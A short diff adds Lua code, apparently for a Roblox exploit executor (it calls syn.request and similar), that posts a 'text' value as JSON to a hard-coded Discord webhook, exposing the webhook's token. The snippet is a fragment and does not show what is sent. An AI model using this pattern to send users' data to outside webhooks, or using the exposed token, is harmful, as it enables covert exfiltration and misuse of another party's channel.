@@ -1,1 +1,14 @@
+local url =
+   "https://discord.com/api/webhooks/995761666602061855/KvoTDUO44HdUNOqwYyUsrzPzt0MBRULt8HJ4swqFivaoC9oHcrB_E8e4JGKxOL7lf2Ll"
+local data = {
+   ["content"] = text, 
 
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
